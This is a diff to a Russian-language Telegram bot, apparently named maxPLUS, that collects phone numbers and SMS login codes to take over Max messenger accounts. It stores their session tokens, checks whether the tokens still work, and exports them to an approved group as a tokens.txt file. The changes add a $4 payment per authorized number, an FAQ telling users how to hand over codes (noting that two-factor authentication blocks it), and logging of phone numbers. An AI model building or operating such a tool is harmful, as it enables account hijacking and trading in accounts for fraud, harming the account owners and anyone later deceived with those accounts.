@@ -1,10 +1,22 @@
 import asyncio
 import os
 import asyncpg
+import logging
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
 from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from pymax import Client, ExtraConfig
+
+# === Логирование ===
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    handlers=[
+        logging.FileHandler("bot.log", encoding="utf-8"),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
 
 # === Конфигурация из переменных окружения ===
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -47,6 +59,13 @@ async def init_db():
                 created_at TIMESTAMP DEFAULT NOW()
             )
         """)
+        await conn.execute("""
+            CREATE TABLE IF NOT EXISTS users (
+                user_id BIGINT PRIMARY KEY,
+                balance REAL DEFAULT 0.0
+            )
+        """)
+    logger.info("База данных инициализирована")
 
 async def is_group_approved(group_id: int) -> bool:
     async with db_pool.acquire() as conn:
@@ -69,6 +88,20 @@ async def get_all_tokens():
 async def update_token_status(phone: str, alive: bool):
     async with db_pool.acquire() as conn:
         await conn.execute("UPDATE tokens SET alive = $1 WHERE phone = $2", alive, phone)
+
+# === Баланс пользователя ===
+async def get_user_balance(user_id: int) -> float:
+    async with db_pool.acquire() as conn:
+        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", user_id)
+        return row["balance"] if row else 0.0
+
+async def add_to_balance(user_id: int, amount: float):
+    async with db_pool.acquire() as conn:
+        await conn.execute(
+            "INSERT INTO users (user_id, balance) VALUES ($1, $2) "
+            "ON CONFLICT (user_id) DO UPDATE SET balance = users.balance + $2",
+            user_id, amount
+        )
 
 # === Проверка токена на живость ===
 async def check_token_alive(token: str) -> bool:
@@ -128,6 +161,7 @@ def main_menu_keyboard():
 
 @dp.message(Command("start"))
 async def start_cmd(msg: Message):
+    logger.info(f"User {msg.from_user.id} — /start")
     await msg.answer(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")
 
 @dp.message(Command("cancel"))
@@ -135,6 +169,7 @@ async def cancel_cmd(msg: Message):
     expecting_phone.discard(msg.from_user.id)
     waiting_code.pop(msg.from_user.id, None)
     pending.pop(msg.from_user.id, None)
+    logger.info(f"User {msg.from_user.id} — /cancel")
     await msg.answer(main_menu_text(), reply_markup=main_menu_keyboard(), parse_mode="MarkdownV2")
 
 @dp.message(Command("help"))
@@ -167,6 +202,7 @@ async def set_group(msg: Message):
                 "INSERT INTO approved_groups (group_id) VALUES ($1) ON CONFLICT DO NOTHING",
                 group_id
             )
+        logger.info(f"Admin {msg.from_user.id} — одобрил группу {group_id}")
         await msg.answer(f"✅ Группа {group_id} одобрена")
     except (IndexError, ValueError):
         await msg.answer("❌ Используй: /set ID_группы")
@@ -182,6 +218,7 @@ async def unset_group(msg: Message):
         group_id = int(msg.text.split()[1])
         async with db_pool.acquire() as conn:
             await conn.execute("DELETE FROM approved_groups WHERE group_id = $1", group_id)
+        logger.info(f"Admin {msg.from_user.id} — удалил группу {group_id}")
         await msg.answer(f"✅ Группа {group_id} больше не одобрена")
     except (IndexError, ValueError):
         await msg.answer("❌ Используй: /unset ID_группы")
@@ -224,15 +261,17 @@ async def get_tokens(msg: Message):
     file.name = "tokens.txt"
 
     await msg.answer_document(file, caption=text)
+    logger.info(f"Group {msg.chat.id} — /get, токенов: {len(tokens)}")
 
 # === Обработчики callback'ов ===
 
 @dp.callback_query(lambda c: c.data == "profile")
 async def profile_callback(callback: CallbackQuery):
     user_id = callback.from_user.id
+    balance = await get_user_balance(user_id)
     text = (
         f"🪪 Ваш ID: {user_id}\n"
-        "💰 Баланс: \\$0\\.00"
+        f"💰 Баланс: \\${balance:.2f}"
     )
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -257,7 +296,25 @@ async def withdraw_callback(callback: CallbackQuery):
 
 @dp.callback_query(lambda c: c.data == "faq")
 async def faq_callback(callback: CallbackQuery):
-    await callback.answer("❓ FAQ", show_alert=True)
+    text = (
+        "🔖 <b>Инструкция по использованию maxPLUS</b>\n\n"
+        "1. Нажмите <b>«Начать работу»</b> в главном меню\n"
+        "2. Отправьте номер телефона в международном формате\n"
+        "   Например: +79161234567 или 89161234567\n"
+        "3. Дождитесь SMS с кодом подтверждения 📩\n"
+        "4. Введите код <b>строго ответом</b> на сообщение бота\n"
+        "5. После успешной авторизации баланс пополнится на $4.00 💰\n\n"
+        "🔐 Код состоит ровно из 6 цифр, без букв и символов\n"
+        "🛡️ Если на номере включена двухфакторная аутентификация — авторизация невозможна\n"
+        "📩 При проблемах с SMS — подождите минуту и попробуйте снова"
+    )
+
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Назад", callback_data="back_to_start")]
+    ])
+
+    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
+    await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "start_work")
 async def start_work_callback(callback: CallbackQuery):
@@ -301,6 +358,8 @@ async def phone_handler(msg: Message):
 
     expecting_phone.discard(msg.from_user.id)
 
+    logger.info(f"User {msg.from_user.id} — запрос SMS на номер {phone}")
+
     sms_provider = TelegramSmsProvider()
     client = Client(
         phone=phone,
@@ -327,7 +386,12 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
         if token:
             await save_token_to_db(phone, token)
 
-        await msg.answer(f"✅ {phone} авторизован!\nТокен сохранён в базу данных")
+        await add_to_balance(msg.from_user.id, 4.0)
+        logger.info(f"User {msg.from_user.id} — номер {phone} успешно авторизован")
+        await msg.answer(
+            "📲 Номер успешно авторизован, на ваш баланс зачислено \\$4\\.00",
+            parse_mode="MarkdownV2"
+        )
     except Exception as e:
         waiting_code.pop(msg.from_user.id, None)
         error_text = str(e).lower()
@@ -345,6 +409,8 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
             await msg.answer("❌ Этот номер уже был авторизован ранее, повторный вход не требуется")
         else:
             await msg.answer(f"❌ Ошибка: {e}")
+
+        logger.warning(f"User {msg.from_user.id} — номер {phone} ошибка: {error_text}")
     finally:
         pending.pop(msg.from_user.id, None)
 
@@ -363,12 +429,13 @@ async def code_as_reply(msg: Message):
     data = pending[msg.from_user.id]
     provider = data["provider"]
     waiting_code.pop(msg.from_user.id, None)
+    logger.info(f"User {msg.from_user.id} — код принят для {data['phone']}")
     await provider.set_code(code)
     await msg.answer("📩 Код принят, запущен процесс авторизации. Ожидайте завершения...")
 
 async def main():
     await init_db()
-    print("Бот запущен")
+    logger.info("Бот запущен")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
